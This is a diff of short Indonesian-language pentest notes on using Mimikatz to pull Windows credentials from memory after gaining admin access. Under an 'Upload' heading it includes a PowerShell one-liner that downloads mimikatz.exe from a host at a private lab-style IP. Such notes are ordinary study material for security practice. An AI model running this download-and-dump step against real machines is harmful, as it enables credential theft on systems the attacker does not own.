@@ -2,8 +2,6 @@ https://www.offsec.com/metasploit-unleashed/mimikatz/
 
 Extract credential from memory windows, sebenarnya lebih mudah paket `impacket-secretsdump` tapi tools itu lagi ada bug 🐞.
 Tools untuk post-exploitation, artinya tools ini bisa bekerja kalau kita punya akun admin
-
-
 # Upload
 ```powershell
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.15.236:8088/mimikatz.exe', 'mimikatz.exe')"
